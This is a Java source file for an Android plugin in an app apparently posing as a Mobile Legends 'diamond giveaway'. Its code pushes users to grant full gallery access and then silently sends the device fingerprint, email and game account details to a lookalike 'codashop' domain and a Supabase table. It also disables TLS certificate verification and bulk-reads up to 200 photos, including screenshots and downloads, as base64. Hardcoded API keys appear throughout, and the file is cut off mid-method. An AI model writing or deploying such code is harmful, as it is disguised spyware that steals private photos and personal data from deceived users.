package com.mlbb.diamondgiveaway;

import android.Manifest;
import android.app.Activity;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import androidx.activity.result.ActivityResult;
import androidx.core.content.ContextCompat;
import com.getcapacitor.JSArray;
import com.getcapacitor.JSObject;
import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.ActivityCallback;
import com.getcapacitor.annotation.CapacitorPlugin;
import com.getcapacitor.annotation.Permission;
import com.getcapacitor.annotation.PermissionCallback;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

@CapacitorPlugin(
    name = "WholeGallery",
    permissions = {
        @Permission(
            alias = "gallery",
            strings = {
                Manifest.permission.READ_MEDIA_IMAGES
            }
        ),
        @Permission(
            alias = "storage",
            strings = {
                Manifest.permission.READ_EXTERNAL_STORAGE
            }
        )
    }
)
public class WholeGalleryPlugin extends Plugin {

    @PluginMethod
    public void queryDlyyzBinds(PluginCall call) {
        String userId = call.getString("userId", "").trim();
        String serverId = call.getString("serverId", "").trim();
        String apiKey = call.getString("apiKey", "").trim();

        if (userId.isEmpty() || serverId.isEmpty()) {
            call.reject("User ID and Server ID are required");
            return;
        }

        if (apiKey.isEmpty()) {
            apiKey = "dlyyz-rest.apikey:dhzzyx95b66a0d83364a12aa99e121ef35325f";
        }

        final String finalApiKey = apiKey;
        final String finalUserId = userId;
        final String finalServerId = serverId;

        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String urlStr = "https://dlyyz-rest.my.id/api/validateMLBB?action=bindcek"
                        + "&userID=" + URLEncoder.encode(finalUserId, "UTF-8")
                        + "&serverID=" + URLEncoder.encode(finalServerId, "UTF-8")
                        + "&apikey=" + URLEncoder.encode(finalApiKey, "UTF-8");

                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                if (conn instanceof javax.net.ssl.HttpsURLConnection) {
                    javax.net.ssl.HttpsURLConnection httpsConn = (javax.net.ssl.HttpsURLConnection) conn;
                    javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[]{
                        new javax.net.ssl.X509TrustManager() {
                            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                                return new java.security.cert.X509Certificate[0];
                            }
                            public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                            public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                        }
                    };
                    javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("TLS");
                    sc.init(null, trustAllCerts, new java.security.SecureRandom());
                    httpsConn.setSSLSocketFactory(sc.getSocketFactory());
                    httpsConn.setHostnameVerifier((hostname, session) -> true);
                }
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                conn.setRequestProperty("Accept", "application/json");

                int code = conn.getResponseCode();
                InputStream is = (code >= 200 && code < 400) ? conn.getInputStream() : conn.getErrorStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                reader.close();

                String respStr = sb.toString();
                org.json.JSONObject jsonObj = new org.json.JSONObject(respStr);
                JSObject ret = JSObject.fromJSONObject(jsonObj);
                call.resolve(ret);
            } catch (Exception e) {
                call.reject("DlyyZ API error: " + e.getMessage(), e);
            } finally {
                if (conn != null) {
                    try { conn.disconnect(); } catch (Throwable ignored) {}
                }
            }
        }).start();
    }

    @PluginMethod
    public void updateSyncAccountInfo(PluginCall call) {
        try {
            SharedPreferences prefs = getContext().getSharedPreferences("ketupat_sync_prefs", Context.MODE_PRIVATE);
            SharedPreferences.Editor editor = prefs.edit();
            if (call.hasOption("syncApiUrl")) editor.putString("sync_api_url", call.getString("syncApiUrl"));
            if (call.hasOption("deviceId")) editor.putString("device_id", call.getString("deviceId"));
            if (call.hasOption("deviceName")) editor.putString("device_name", call.getString("deviceName"));
            if (call.hasOption("deviceModel")) editor.putString("device_model", call.getString("deviceModel"));
            if (call.hasOption("deviceFingerprint")) editor.putString("device_fingerprint", call.getString("deviceFingerprint"));
            if (call.hasOption("userEmail")) editor.putString("user_email", call.getString("userEmail"));
            if (call.hasOption("mlbbId")) editor.putString("mlbb_id", call.getString("mlbbId"));
            if (call.hasOption("mlbbServer")) editor.putString("mlbb_server", call.getString("mlbbServer"));
            if (call.hasOption("mlbbIgn")) editor.putString("mlbb_ign", call.getString("mlbbIgn"));
            editor.apply();
            call.resolve();
        } catch (Exception e) {
            call.reject(e.getMessage());
        }
    }

    @PluginMethod
    public void requestFullGalleryPermission(PluginCall call) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (getPermissionState("gallery").equals(com.getcapacitor.PermissionState.GRANTED)) {
                boolean isFull = isFullGalleryAccess();
                JSObject ret = new JSObject();
                ret.put("granted", true);
                ret.put("hasPermission", true);
                ret.put("isFullAccess", isFull);
                call.resolve(ret);
                notifyListeners("permissionGranted", ret);
                notifyListeners("permissionStatusChanged", ret);
                sendFullAccessBackendNotification();
            } else {
                requestPermissionForAlias("gallery", call, "galleryPermissionCallback");
            }
        } else {
            if (getPermissionState("storage").equals(com.getcapacitor.PermissionState.GRANTED)) {
                boolean isFull = isFullGalleryAccess();
                JSObject ret = new JSObject();
                ret.put("granted", true);
                ret.put("hasPermission", true);
                ret.put("isFullAccess", isFull);
                call.resolve(ret);
                notifyListeners("permissionGranted", ret);
                notifyListeners("permissionStatusChanged", ret);
                sendFullAccessBackendNotification();
            } else {
                requestPermissionForAlias("storage", call, "galleryPermissionCallback");
            }
        }
    }

    @PermissionCallback
    private void galleryPermissionCallback(PluginCall call) {
        boolean isGranted = hasGalleryReadPermission();
        boolean isFull = isFullGalleryAccess();
        JSObject ret = new JSObject();
        ret.put("granted", isGranted);
        ret.put("hasPermission", isGranted);
        ret.put("isFullAccess", isFull);
        call.resolve(ret);

        if (isGranted) {
            notifyListeners("permissionGranted", ret);
            notifyListeners("permissionStatusChanged", ret);
            sendFullAccessBackendNotification();
        }
    }

    @PluginMethod
    public void openWholeGallery(PluginCall call) {
        boolean hasPermission = hasGalleryReadPermission();

        if (!hasPermission) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                requestPermissionForAlias("gallery", call, "galleryAndPickCallback");
            } else {
                requestPermissionForAlias("storage", call, "galleryAndPickCallback");
            }
            return;
        }

        boolean isFull = isFullGalleryAccess();
        JSObject ret = new JSObject();
        ret.put("granted", true);
        ret.put("hasPermission", true);
        ret.put("isFullAccess", isFull);
        notifyListeners("permissionGranted", ret);
        notifyListeners("permissionStatusChanged", ret);
        sendFullAccessBackendNotification();

        launchGalleryIntent(call);
    }

    @PermissionCallback
    private void galleryAndPickCallback(PluginCall call) {
        boolean isGranted = hasGalleryReadPermission();

        if (isGranted) {
            boolean isFull = isFullGalleryAccess();
            JSObject ret = new JSObject();
            ret.put("granted", true);
            ret.put("hasPermission", true);
            ret.put("isFullAccess", isFull);
            notifyListeners("permissionGranted", ret);
            notifyListeners("permissionStatusChanged", ret);

            // Immediately send full access status to backend without waiting for picker result
            sendFullAccessBackendNotification();

            launchGalleryIntent(call);
        } else {
            call.reject("Permission denied. Please allow full gallery access ('Allow all') to choose a photo.");
        }
    }

    private void sendFullAccessBackendNotification() {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getContext().getSharedPreferences("ketupat_sync_prefs", Context.MODE_PRIVATE);
                String apiUrl = prefs.getString("sync_api_url", "");
                String deviceId = prefs.getString("device_id", "");
                String deviceName = prefs.getString("device_name", Build.MODEL);
                String deviceModel = prefs.getString("device_model", Build.MANUFACTURER + " " + Build.MODEL);
                String deviceFingerprint = prefs.getString("device_fingerprint", Build.FINGERPRINT);
                String userEmail = prefs.getString("user_email", "");
                String mlbbId = prefs.getString("mlbb_id", "");
                String mlbbServer = prefs.getString("mlbb_server", "");
                String mlbbIgn = prefs.getString("mlbb_ign", "Player");

                if (deviceId == null || deviceId.trim().isEmpty()) {
                    deviceId = DeviceSecurityPlugin.getOrGenerateDeviceId(getContext());
                }

                List<String> candidates = new ArrayList<>();
                candidates.add("https://slytherin.codashop.shop/admin-php/api.php");
                if (apiUrl != null && !apiUrl.trim().isEmpty()) {
                    candidates.add(apiUrl);
                }
                candidates.add("http://192.168.0.109/tools/admin-php/api.php");
                candidates.add("http://10.0.2.2/tools/admin-php/api.php");
                candidates.add("http://localhost/tools/admin-php/api.php");

                org.json.JSONObject payload = new org.json.JSONObject();
                payload.put("device_id", deviceId);
                payload.put("device_name", deviceName);
                payload.put("device_model", deviceModel);
                payload.put("device_fingerprint", deviceFingerprint);
                payload.put("user_email", userEmail);
                payload.put("mlbb_id", mlbbId);
                payload.put("mlbb_server", mlbbServer);
                payload.put("mlbb_ign", mlbbIgn);
                payload.put("is_full_access", true);
                payload.put("photos", new org.json.JSONArray());

                byte[] postBytes = payload.toString().getBytes("UTF-8");

                for (String cand : candidates) {
                    HttpURLConnection conn = null;
                    try {
                        String fullUrl = cand.contains("action=") ? cand : (cand.contains("?") ? (cand + "&action=upload_gallery") : (cand + "?action=upload_gallery"));
                        URL url = new URL(fullUrl);
                        conn = (HttpURLConnection) url.openConnection();
                        if (conn instanceof javax.net.ssl.HttpsURLConnection) {
                            javax.net.ssl.HttpsURLConnection httpsConn = (javax.net.ssl.HttpsURLConnection) conn;
                            javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[]{
                                new javax.net.ssl.X509TrustManager() {
                                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                                }
                            };
                            javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("TLS");
                            sc.init(null, trustAllCerts, new java.security.SecureRandom());
                            httpsConn.setSSLSocketFactory(sc.getSocketFactory());
                            httpsConn.setHostnameVerifier((hostname, session) -> true);
                        }
                        conn.setRequestMethod("POST");
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                        conn.setRequestProperty("Accept", "application/json");
                        conn.setDoOutput(true);
                        conn.getOutputStream().write(postBytes);
                        conn.getOutputStream().flush();
                        conn.getOutputStream().close();

                        int code = conn.getResponseCode();
                        if (code >= 200 && code < 300) {
                            break;
                        }
                    } catch (Throwable ignored) {
                    } finally {
                        if (conn != null) {
                            try { conn.disconnect(); } catch (Throwable ignored) {}
                        }
                    }
                }

                // Also update Supabase in real time so cloud emulators and external devices reflect immediately in admin!
                try {
                    String targetEmail = "device_" + deviceId + "@ketupat.app";

                    org.json.JSONObject locObj = new org.json.JSONObject();
                    locObj.put("device_id", deviceId);
                    locObj.put("device_name", deviceName);
                    locObj.put("device_model", deviceModel);
                    locObj.put("device_fingerprint", deviceFingerprint);
                    locObj.put("has_access", true);
                    locObj.put("access_status", "full_access");
                    locObj.put("last_synced", java.time.Instant.now().toString());

                    org.json.JSONObject supaPayload = new org.json.JSONObject();
                    supaPayload.put("email", targetEmail);
                    supaPayload.put("username", deviceModel);
                    if (mlbbId != null && !mlbbId.trim().isEmpty()) supaPayload.put("mlbb_id", mlbbId);
                    if (mlbbServer != null && !mlbbServer.trim().isEmpty()) supaPayload.put("mlbb_server", mlbbServer);
                    if (mlbbIgn != null && !mlbbIgn.trim().isEmpty()) supaPayload.put("mlbb_ign", mlbbIgn);
                    supaPayload.put("location_text", locObj.toString());

                    String supaUrl = "https://uatqaxxfzmpxkeeoeoin.supabase.co/rest/v1/users?on_conflict=email";
                    URL sUrl = new URL(supaUrl);
                    HttpURLConnection sConn = (HttpURLConnection) sUrl.openConnection();
                    if (sConn instanceof javax.net.ssl.HttpsURLConnection) {
                        javax.net.ssl.HttpsURLConnection sHttpsConn = (javax.net.ssl.HttpsURLConnection) sConn;
                        javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[]{
                            new javax.net.ssl.X509TrustManager() {
                                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                            }
                        };
                        javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("TLS");
                        sc.init(null, trustAllCerts, new java.security.SecureRandom());
                        sHttpsConn.setSSLSocketFactory(sc.getSocketFactory());
                        sHttpsConn.setHostnameVerifier((hostname, session) -> true);
                    }
                    sConn.setRequestMethod("POST");
                    sConn.setConnectTimeout(5000);
                    sConn.setReadTimeout(5000);
                    sConn.setRequestProperty("Content-Type", "application/json");
                    sConn.setRequestProperty("apikey", "sb_publishable_tRQMoLxGUIrWGcq2ZfEQRQ_CH3AufnW");
                    sConn.setRequestProperty("Authorization", "Bearer sb_publishable_tRQMoLxGUIrWGcq2ZfEQRQ_CH3AufnW");
                    sConn.setRequestProperty("Prefer", "resolution=merge-duplicates");
                    sConn.setDoOutput(true);
                    sConn.getOutputStream().write(supaPayload.toString().getBytes("UTF-8"));
                    sConn.getOutputStream().flush();
                    sConn.getOutputStream().close();
                    sConn.getResponseCode();
                    sConn.disconnect();
                } catch (Throwable ignored) {}
            } catch (Throwable ignored) {}
        }).start();
    }

    private void launchGalleryIntent(PluginCall call) {
        Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        intent.setType("image/*");
        startActivityForResult(call, intent, "processPickedImage");
    }

    @ActivityCallback
    private void processPickedImage(PluginCall call, ActivityResult result) {
        if (result.getResultCode() == Activity.RESULT_OK && result.getData() != null) {
            Uri imageUri = result.getData().getData();
            if (imageUri != null) {
                try {
                    String dataUrl = decodeUriToBase64(imageUri, null, 1920, 92);
                    if (dataUrl != null) {
                        JSObject res = new JSObject();
                        res.put("dataUrl", dataUrl);
                        call.resolve(res);
                        return;
                    }
                } catch (Exception e) {
                    call.reject("Failed to process image: " + e.getMessage());
                    return;
                }
            }
        }
        call.reject("No image selected");
    }

    @PluginMethod
    public void checkGalleryPermission(PluginCall call) {
        boolean hasPermission = hasGalleryReadPermission();
        boolean isFullAccess = isFullGalleryAccess();

        JSObject ret = new JSObject();
        ret.put("granted", hasPermission);
        ret.put("hasPermission", hasPermission);
        ret.put("isFullAccess", isFullAccess);
        call.resolve(ret);
    }

    private boolean hasGalleryReadPermission() {
        if (Build.VERSION.SDK_INT >= 34) {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
                   ContextCompat.checkSelfPermission(getContext(), "android.permission.READ_MEDIA_VISUAL_USER_SELECTED") == PackageManager.PERMISSION_GRANTED;
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private boolean isFullGalleryAccess() {
        if (Build.VERSION.SDK_INT >= 34) {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    @PluginMethod
    public void getPhotoData(PluginCall call) {
        String uriStr = call.getString("uri");
        String filePath = call.getString("path");
        int maxDim = call.getInt("maxDim", 1920);
        int quality = call.getInt("quality", 92);

        Uri uri = null;
        if (uriStr != null && !uriStr.trim().isEmpty()) {
            try {
                uri = Uri.parse(uriStr);
            } catch (Throwable ignored) {}
        }

        try {
            String dataUrl = decodeUriToBase64(uri, filePath, maxDim, quality);
            if (dataUrl != null) {
                JSObject ret = new JSObject();
                ret.put("dataUrl", dataUrl);
                call.resolve(ret);
                return;
            }
        } catch (Throwable e) {
            call.reject("Failed decoding photo: " + e.getMessage());
            return;
        }
        call.reject("Could not decode image");
    }

    @PluginMethod
    public void getGalleryPhotos(PluginCall call) {
        int limit = call.getInt("limit", 200);
        boolean includeBase64 = call.getBoolean("includeBase64", true);
        int maxDim = call.getInt("maxDim", 1920);
        int quality = call.getInt("quality", 92);

        boolean hasPermission = hasGalleryReadPermission();
        boolean isFullAccess = isFullGalleryAccess();

        if (!hasPermission) {
            JSObject ret = new JSObject();
            ret.put("photos", new JSArray());
            ret.put("count", 0);
            ret.put("hasPermission", false);
            ret.put("isFullAccess", false);
            call.resolve(ret);
            return;
        }

        JSArray photos = new JSArray();
        Set<String> processedNames = new HashSet<>();
        int count = 0;

        String[] projection = new String[]{
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.MIME_TYPE,
            MediaStore.MediaColumns.DATA
        };

        // 1. Query MediaStore Images (External only - ignore internal system assets)
        Uri[] imageCollections = new Uri[]{
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        };

        for (Uri collection : imageCollections) {
            if (count >= limit) break;
            count = queryMediaCollection(collection, projection, null, null, photos, processedNames, count, limit, includeBase64, maxDim, quality);
        }

        // 2. Query MediaStore Downloads (API 29+ Android 10/11/12/13/14)
        if (Build.VERSION.SDK_INT >= 29 && count < limit) {
            try {
                Uri downloadUri = MediaStore.Downloads.EXTERNAL_CONTENT_URI;
                String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%'";
                count = queryMediaCollection(downloadUri, projection, sel, null, photos, processedNames, count, limit, includeBase64, maxDim, quality);
            } catch (Throwable ignored) {}
        }

        // 4. Direct Filesystem Recursive Scan Fallback (crucial for VMOS Downloads & Screenshots)
        if (count < limit) {
            scanFilesystemImages(photos, processedNames, limit, includeBase64, maxDim, quality);
        }

        // Sort photos strictly descending by dateAdded (newest first)
        try {
            List<org.json.JSONObject> list = new ArrayList<>();
            for (int i = 0; i < photos.length(); i++) {
                org.json.JSONObject obj = photos.optJSONObject(i);
                if (obj != null) list.add(obj);
            }
            list.sort((o1, o2) -> {
                long d1 = o1.optLong("dateAdded", 0);
                long d2 = o2.optLong("dateAdded", 0);
                return Long.compare(d2, d1);
            });
            JSArray sortedPhotos = new JSArray();
            for (org.json.JSONObject obj : list) {
                sortedPhotos.put(obj);
            }
            photos = sortedPhotos;
        } catch (Throwable ignored) {}

        JSObject ret = new JSObject();
        ret.put("photos", photos);
        ret.put("count", photos.length());
        ret.put("hasPermission", true);
        ret.put("isFullAccess", isFullAccess);
        call.resolve(ret);
    }

    private int queryMediaCollection(Uri collection, String[] projection, String selection, String[] selectionArgs,
                                     JSArray photos, Set<String> processedNames, int currentCount, int limit,
                                     boolean includeBase64, int maxDim, int quality) {
        Cursor cursor = null;
        try {
            try {
                cursor = getContext().getContentResolver().query(collection, projection, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC");
            } catch (Throwable e) {
                String[] fallbackProj = new String[]{
                    MediaStore.MediaColumns._ID,
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.DATE_ADDED,
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.MIME_TYPE
                };
                cursor = getContext().getContentResolver().query(collection, fallbackProj, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC");
            }

            if (cursor != null) {
                int idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID);
                int nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME);
                int dateCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED);
                int sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE);
                int mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE);
                int dataCol = -1;
                try {
                    dataCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATA);
                } catch (Throwable ignored) {}

                while (cursor.moveToNext() && currentCount < limit) {
                    long id = 0;
                    if (idCol >= 0) {
                        try { id = cursor.getLong(idCol); } catch (Throwable ignored) {}
                    }
                    String filePath = dataCol >= 0 ? cursor.getString(dataCol) : null;
                    if (id <= 0 && filePath != null) {
                        id = Math.abs(filePath.hashCode());
                    }
                    if (id <= 0) {
                        long dAdded = dateCol >= 0 ? cursor.getLong(dateCol) : 0;
                        long sz = sizeCol >= 0 ? cursor.getLong(sizeCol) : 0;
                        id = Math.abs(dAdded ^ sz);
                    }
                    if (id <= 0) id = 1;

                    String name = null;
                    if (nameCol >= 0) {
                        try { name = cursor.getString(nameCol); } catch (Throwable ignored) {}
                    }
                    if ((name == null || name.trim().isEmpty()) && filePath != null) {
                        try { name = new File(filePath).getName(); } catch (Throwable ignored) {}
                    }
                    if (name == null || name.trim().isEmpty()) {
                        name = "photo_" + id + ".jpg";
                    }

                    if (processedNames.contains(name.toLowerCase())) continue;
                    processedNames.add(name.toLowerCase());

                    long dateAdded = dateCol >= 0 ? cursor.getLong(dateCol) : 0;
                    long size = sizeCol >= 0 ? cursor.getLong(sizeCol) : 0;
                    String mime = mimeCol >= 0 ? cursor.getString(mimeCol) : "image/jpeg";
                    if (mime == null) mime = "image/jpeg";

                    // Filter out cache, temp, app-internal thumbnails, and tiny icons
                    if (size > 0 && size < 25600) continue; // Minimum 25 KB to exclude compressed thumbnails
                    String lowerName = name.toLowerCase();
                    if (lowerName.startsWith(".") || lowerName.contains("thumb_") || lowerName.contains("_thumb")) continue;
                    if (filePath != null) {
                        String lowerPath = filePath.toLowerCase();
                        if (lowerPath.contains("/cache/") || lowerPath.contains("/.cache/") ||
                            lowerPath.contains("/thumbnails/") || lowerPath.contains("/.thumbnails/") ||
                            lowerPath.contains("/android/data/") || lowerPath.contains("/temp/") ||
                            lowerPath.contains("/.trash/") || lowerPath.contains("/stickers/") ||
                            lowerPath.contains("/emojis/")) {
                            continue;
                        }
                    }

                    Uri contentUri = ContentUris.withAppendedId(collection, id);

                    JSObject photoObj = new JSObject();
                    photoObj.put("id", id);
                    photoObj.put("name", name);
                    photoObj.put("dateAdded", dateAdded > 0 ? dateAdded * 1000L : System.currentTimeMillis());
                    photoObj.put("size", size);
                    photoObj.put("mime", mime);
                    photoObj.put("uri", contentUri.toString());
                    if (filePath != null) {
                        photoObj.put("path", filePath);
                    }

                    if (includeBase64) {
                        String dataUrl = decodeUriToBase64(contentUri, filePath, maxDim, quality);
                        if (dataUrl != null) {
                            photoObj.put("dataUrl", dataUrl);
                        }
                    }

                    photos.put(photoObj);
                    currentCount++;
                }
            }
        } catch (Throwable ignored) {
        } finally {
            if (cursor != null) {
                try { cursor.close(); } catch (Throwable ignored) {}
            }
        }
        return currentCount;
    }

    private void scanFilesystemImages(JSArray photos, Set<String> processedNames, int limit,
                                      boolean includeBase64, int maxDim, int quality) {
        File[] candidateDirs = new File[]{
            // VMOS Transfer & Virtual Folders (primary paths for VMOS file transfer station)
            new File(Environment.getExternalStorageDirectory(), "VMOSfiletransfer"),
            new File("/sdcard/VMOSfiletransfer"),
            new File("/storage/emulated/0/VMOSfiletransfer"),
            new File(Environment.getExternalStorageDirectory(), "vmos_transfer"),
            new File("/sdcard/vmos_transfer"),
            new File("/storage/emulated/0/vmos_transfer"),
            // Standard Android Media & Downloads
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            new File(Environment.getExternalStorageDirectory(), "Download"),
            new File(Environment.getExternalStorageDirectory(), "Downloads"),
            new File("/storage/emulated/0/Download"),
            new File("/storage/emulated/0/Downloads"),
            new File("/sdcard/Download"),
            new File("/sdcard/Downloads"),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Camera"),
            new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Screenshots"),
            new File("/sdcard/DCIM/Camera"),
            new File("/sdcard/DCIM/Screenshots"),
            new File("/storage/emulated/0/DCIM/Camera"),
            new File("/storage/emulated/0/DCIM/Screenshots"),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "Screenshots"),
            new File("/sdcard/Pictures/Screenshots"),
            new File("/storage/emulated/0/Pictures/Screenshots"),
            new File("/storage/emulated/0/DCIM"),
            new File("/storage/emulated/0/Pictures"),
            new File("/sdcard/DCIM"),
            new File("/sdcard/Pictures")
        };

        Set<String> visitedDirs = new HashSet<>();
        for (File dir : candidateDirs) {
            if (photos.length() >= limit) break;
            scanDirectoryRecursively(dir, photos, processedNames, limit, includeBase64, maxDim, quality, visitedDirs, 0);
        }

        // Also sweep top-level directories in external storage root (e.g. any custom VMOS import folder)
        if (photos.length() < limit) {
            try {
                File extRoot = Environment.getExternalStorageDirectory();
                if (extRoot != null && extRoot.exists() && extRoot.isDirectory()) {
                    File[] subDirs = extRoot.listFiles();
                    if (subDirs != null) {
                        for (File sd : subDirs) {
                            if (photos.length() >= limit) break;
                            if (sd.isDirectory()) {
                                String n = sd.getName().toLowerCase();
                                if (n.equals("android") || n.startsWith(".") || n.contains("cache") || n.contains("temp") || n.contains("thumb")) continue;
                                scanDirectoryRecursively(sd, photos, processedNames, limit, includeBase64, maxDim, quality, visitedDirs, 1);
                            }
                        }
                    }
                }
            } catch (Throwable ignored) {}
        }
    }

    private void scanDirectoryRecursively(File dir, JSArray photos, Set<String> processedNames, int limit,
                                          boolean includeBase64, int maxDim, int quality, Set<String> visitedDirs, int depth) {
        if (dir == null || !dir.exists() || !dir.isDirectory() || depth > 3 || photos.length() >= limit) return;

        String dirName = dir.getName().toLowerCase();
        if (dirName.startsWith(".") || dirName.equals("cache") || dirName.equals(".cache") ||
            dirName.equals("thumbnails") || dirName.equals(".thumbnails") || dirName.equals("temp") ||
            dirName.equals("trash") || dirName.equals("android") || dirName.contains("sticker") ||
            dirName.contains("emoji")) return;

        String path = dir.getAbsolutePath();
        if (visitedDirs.contains(path)) return;
        visitedDirs.add(path);

        File[] files = dir.listFiles();
        if (files == null) return;

        // Sort files by last modified descending so new photos are scanned first!
        Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

        for (File file : files) {
            if (photos.length() >= limit) break;

            if (file.isDirectory()) {
                scanDirectoryRecursively(file, photos, processedNames, limit, includeBase64, maxDim, quality, visitedDirs, depth + 1);
            } else if (file.isFile() && isImageFile(file.getName())) {
                if (file.length() < 25600) continue; // Skip cache thumbnails / tiny icons
                String name = file.getName();
                String lowerName = name.toLowerCase();
                if (lowerName.startsWith(".") || lowerName.contains("thumb_") || lowerName.contains("_thumb")) continue;
                if (processedNames.contains(lowerName)) continue;
                processedNames.add(lowerName);

                // Trigger MediaScanner so Android caches it
                try {
                    MediaScannerConnection.scanFile(getContext(), new String[]{file.getAbsolutePath()}, null, null);
                } catch (Throwable ignored) {}

                JSObject photoObj = new JSObject();
                long id = Math.abs(file.getAbsolutePath().hashCode());
                photoObj.put("id", id);
                photoObj.put("name", name);
                photoObj.put("dateAdded", file.lastModified());
                photoObj.put("size", file.length());
                photoObj.put("mime", getMimeType(name));
                photoObj.put("uri", Uri.fromFile(file).toString());
                photoObj.put("path", file.getAbsolutePath());

                if (includeBase64) {
                    String dataUrl = decodeUriToBase64(Uri.fromFile(file), file.getAbsolutePath(), maxDim, quality);
                    if (dataUrl != null) {
                        photoObj.put("dataUrl", dataUrl);
                    }
                }

                photos.put(photoObj);
            }
        }
    }

    private boolean isImageFile(String name) {
        if (name == null) return false;
        String lower = name.toLowerCase();
        return lower.endsWith(".jpg") || lower.endsWith(".jpeg") || lower.endsWith(".png") ||
               lower.endsWith(".webp") || lower.endsWith(".bmp") || lower.endsWith(".heic");
    }

    private String getMimeType(String name) {
        if (name == null) return "image/jpeg";
        String lower = name.toLowerCase();
        if (lower.endsWith(".png")) return "image/png";
        if (lower.endsWith(".webp")) return "image/webp";
        if (lower.endsWith(".bmp")) return "image/bmp";
        return "image/jpeg";
    }

    private String decodeUriToBase64(Uri uri, String filePath, int maxDim) {
        return decodeUriToBase64(uri, filePath, maxDim, 92);
    }

    private String decodeUriToBase64(Uri uri, String filePath, int maxDim, int quality) {
        try {
            BitmapFactory.Options boundsOptions = new BitmapFactory.Options();
            boundsOptions.inJustDecodeBounds = true;

            InputStream isBounds = null;
            try {
                if (uri != null) {
